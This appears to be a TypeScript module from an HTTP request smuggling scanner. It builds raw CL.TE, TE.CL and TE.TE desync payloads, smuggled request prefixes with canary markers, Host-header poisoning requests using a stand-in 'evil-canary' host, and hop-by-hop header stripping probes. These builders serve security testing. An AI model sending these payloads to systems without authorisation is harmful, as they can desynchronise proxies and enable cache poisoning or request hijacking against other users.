import crypto from 'node:crypto';

export interface SmugglingPayloadPair {
  name: string;
  technique: 'CL_TE' | 'TE_CL' | 'TE_TE' | 'HOST_POISONING' | 'HOP_BY_HOP';
  type: 'TIMING' | 'DUAL_REQUEST' | 'HEADER_INJECTION';
  primaryRequest: Buffer;
  secondaryRequest?: Buffer;
  canaryMarker?: string;
  description: string;
}

export interface PayloadBuildOptions {
  host: string;
  port: number;
  path: string;
  canaryPath: string;
  canaryHost?: string;
}

/**
 * Builds non-destructive CL.TE timing probe payload.
 */
export function buildClTeTimingPayload(options: PayloadBuildOptions): Buffer {
  const { host, path } = options;
  const raw =
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
    `Connection: keep-alive\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: 4\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `\r\n` +
    `1\r\n` +
    `Z\r\n` +
    `Q`;

  return Buffer.from(raw, 'utf-8');
}

/**
 * Builds non-destructive CL.TE dual-request prefix desynchronization payload pair.
 */
export function buildClTeDualPayloads(options: PayloadBuildOptions): {
  firstPayload: Buffer;
  secondPayload: Buffer;
  canaryMarker: string;
} {
  const { host, path, canaryPath } = options;
  const canaryMarker = `canary-${crypto.randomBytes(4).toString('hex')}`;
  const smuggledPrefix =
    `GET ${canaryPath}?${canaryMarker}=1 HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `X-Smuggled-By: SecurityLab\r\n` +
    `X-Canary-Check: ${canaryMarker}\r\n` +
    `X-Ignore: `;

  const body = `0\r\n\r\n${smuggledPrefix}`;
  const contentLength = Buffer.byteLength(body, 'utf-8');

  const firstRaw =
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
    `Connection: keep-alive\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: ${contentLength}\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `\r\n` +
    `${body}`;

  const secondRaw =
    `GET ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
    `Connection: close\r\n` +
    `\r\n`;

  return {
    firstPayload: Buffer.from(firstRaw, 'utf-8'),
    secondPayload: Buffer.from(secondRaw, 'utf-8'),
    canaryMarker,
  };
}

/**
 * Builds non-destructive TE.CL timing probe payload.
 */
export function buildTeClTimingPayload(options: PayloadBuildOptions): Buffer {
  const { host, path } = options;
  const raw =
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
    `Connection: keep-alive\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: 6\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `\r\n` +
    `0\r\n` +
    `\r\n` +
    `X`;

  return Buffer.from(raw, 'utf-8');
}

/**
 * Builds non-destructive TE.CL dual-request prefix desynchronization payload pair.
 */
export function buildTeClDualPayloads(options: PayloadBuildOptions): {
  firstPayload: Buffer;
  secondPayload: Buffer;
  canaryMarker: string;
} {
  const { host, path, canaryPath } = options;
  const canaryMarker = `canary-${crypto.randomBytes(4).toString('hex')}`;
  const smuggledPrefix =
    `GET ${canaryPath}?${canaryMarker}=1 HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `X-Canary-Check: ${canaryMarker}\r\n` +
    `X-Ignore: `;

  const hexSize = Buffer.byteLength(smuggledPrefix, 'utf-8').toString(16);
  const chunkedBody = `${hexSize}\r\n${smuggledPrefix}\r\n0\r\n\r\n`;

  // Content-Length matches just the first chunk header (e.g. 4 bytes)
  const firstRaw =
    `POST ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
    `Connection: keep-alive\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: 4\r\n` +
    `Transfer-Encoding: chunked\r\n` +
    `\r\n` +
    `${chunkedBody}`;

  const secondRaw =
    `GET ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
    `Connection: close\r\n` +
    `\r\n`;

  return {
    firstPayload: Buffer.from(firstRaw, 'utf-8'),
    secondPayload: Buffer.from(secondRaw, 'utf-8'),
    canaryMarker,
  };
}

/**
 * Generates an array of TE.TE obfuscated variations.
 */
export function buildTeTeVariants(options: PayloadBuildOptions): {
  name: string;
  payload: Buffer;
  obfuscationHeader: string;
}[] {
  const { host, path } = options;

  const variations = [
    {
      name: 'TE.TE Dual Header (chunked + cow)',
      header: 'Transfer-Encoding: chunked\r\nTransfer-Encoding: cow',
    },
    {
      name: 'TE.TE Space Before Colon',
      header: 'Transfer-Encoding : chunked',
    },
    {
      name: 'TE.TE Tab Separator',
      header: 'Transfer-Encoding:\tchunked',
    },
    {
      name: 'TE.TE Quoted Value',
      header: 'Transfer-Encoding: "chunked"',
    },
    {
      name: 'TE.TE Mixed Identity/Chunked',
      header: 'Transfer-Encoding: identity, chunked',
    },
    {
      name: 'TE.TE Case Permutation',
      header: 'Transfer-Encoding: chunked\r\ntransfer-encoding: identity',
    },
  ];

  return variations.map((v) => {
    const raw =
      `POST ${path} HTTP/1.1\r\n` +
      `Host: ${host}\r\n` +
      `User-Agent: SecurityLab-Smuggling-Scanner/1.0\r\n` +
      `Connection: close\r\n` +
      `Content-Length: 4\r\n` +
      `${v.header}\r\n` +
      `\r\n` +
      `1\r\n` +
      `Z\r\n` +
      `Q`;
    return {
      name: v.name,
      payload: Buffer.from(raw, 'utf-8'),
      obfuscationHeader: v.header,
    };
  });
}

/**
 * Builds Host Header and X-Forwarded-Host poisoning payloads.
 */
export function buildHostPoisoningPayload(options: PayloadBuildOptions): Buffer {
  const { host, path, canaryHost = 'evil-canary.internal.testing' } = options;
  const raw =
    `GET ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `X-Forwarded-Host: ${canaryHost}\r\n` +
    `X-Host: ${canaryHost}\r\n` +
    `X-Forwarded-Server: ${canaryHost}\r\n` +
    `Connection: close\r\n` +
    `\r\n`;

  return Buffer.from(raw, 'utf-8');
}

/**
 * Builds hop-by-hop header stripping payload.
 */
export function buildHopByHopPayload(options: PayloadBuildOptions, internalHeadersToStrip: string[]): Buffer {
  const { host, path } = options;
  const stripList = internalHeadersToStrip.join(', ');
  const customHeaderLines = internalHeadersToStrip.map((h) => `${h}: probe-value-123\r\n`).join('');

  const raw =
    `GET ${path} HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `Connection: close, ${stripList}\r\n` +
    `${customHeaderLines}` +
    `\r\n`;

  return Buffer.from(raw, 'utf-8');
}
